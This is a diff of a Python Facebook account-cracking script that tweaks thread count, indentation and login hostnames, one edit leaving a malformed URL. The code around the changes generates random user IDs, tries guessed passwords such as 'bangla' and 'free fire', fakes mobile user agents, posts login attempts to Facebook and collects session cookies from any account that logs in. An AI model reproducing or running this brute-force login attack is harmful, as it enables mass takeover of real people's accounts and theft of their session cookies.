@@ -25,16 +25,16 @@ ses=requests.Session()
 ugen=[]
 uas=[]
 for tg in range(5000):
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['5.1.1','6.0.1','7.1.1','10','11','12','13','14','15'])
-	c='SM-J320Y Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	d=random.randrange(40,115)
-	e='0'
-	f=random.randrange(3000,6000)
-	g=random.randrange(20,100)
-	h='Mobile Safari/537.36'
-	REX=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
-	ugen.append(REX)
+        a='Mozilla/5.0 (Linux; Android'
+        b=random.choice(['5.1.1','6.0.1','7.1.1','10','11','12','13','14','15'])
+        c='SM-J320Y Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+        d=random.randrange(40,115)
+        e='0'
+        f=random.randrange(3000,6000)
+        g=random.randrange(20,100)
+        h='Mobile Safari/537.36'
+        REX=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+        ugen.append(REX)
 for ua in range(5000):
       a='Mozilla/5.0 (Linux; Android'
       b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
@@ -124,7 +124,7 @@ def fuck():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
-    with ThreadPool(max_workers=100) as REX:
+    with ThreadPool(max_workers=120) as yaari:
         os.system('clear')
         print(logo)
         os.system('xdg-open https://www.facebook.com/profile.php?id=ruhul.xmin')
@@ -137,7 +137,7 @@ def fuck():
         for guru in user:
             uid = nude+nudex+nud+guru
             pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+'12',nude+'@#','@'+nude,nude+nudex+nud,'bangla','free fire']
-            REX.submit(rcrack,uid,pwx,tl)
+            yaari.submit(rcrack,uid,pwx,tl)
     print('\033[1;32m─────────────────────────────────────────────────────────')
     print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
     print('\033[1;32m─────────────────────────────────────────────────────────')
@@ -153,7 +153,7 @@ def rcrack(uid,pwx,tl):
             bi = random.choice([A,B,C,D,E,F,G,H])
             sys.stdout.write(f'\r \033[1;31m[%sREX\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -164,7 +164,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = { 'authority': 'mbasic.facebook.com',
+            header_freefb = { 'authority': 'facebook.com',
     'method': 'GET',
     'scheme': 'https', 
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -186,7 +186,7 @@ def rcrack(uid,pwx,tl):
     'upgrade-insecure-requests': '1',
     'user-agent': pro,
     'viewport-width': '980',}
-            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://www.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -205,7 +205,7 @@ def rcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        
+
     except:
         pass
 
